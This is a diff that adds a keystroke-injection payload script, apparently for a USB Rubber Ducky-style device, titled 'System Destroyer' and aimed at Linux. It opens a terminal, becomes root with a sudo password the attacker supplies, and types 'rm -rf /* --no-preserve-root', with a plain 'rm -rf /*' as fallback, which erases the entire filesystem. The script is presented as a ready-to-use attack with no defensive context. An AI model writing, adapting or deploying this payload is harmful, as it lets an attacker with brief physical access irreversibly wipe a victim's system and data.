@@ -1,0 +1,39 @@
+
+REM ###################################
+REM #                                 |
+REM # Title        : System Destroyer |
+REM # Author       : Aleff            |
+REM # Version      : 1.0              |
+REM # Category     : Execution        |
+REM # Target       : Linux            |
+REM #                                 |
+REM ###################################
+
+REM Requirements:
+REM     - Permissions
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### PREREQUISITES SECTION ####
+
+
+REM Required: You need to know the sudo password and replace 'example' with this
+DEFINE SUDO_PASS example
+STRING sudo su
+ENTER
+
+DELAY 1000
+STRING SUDO_PASS
+ENTER
+
+DELAY 2000
+STRING "rm -rf /* --no-preserve-root"
+ENTER
+
+REM If --no-preserve-root is not present
+DELAY 500
+STRING "rm -rf /*"
+ENTER
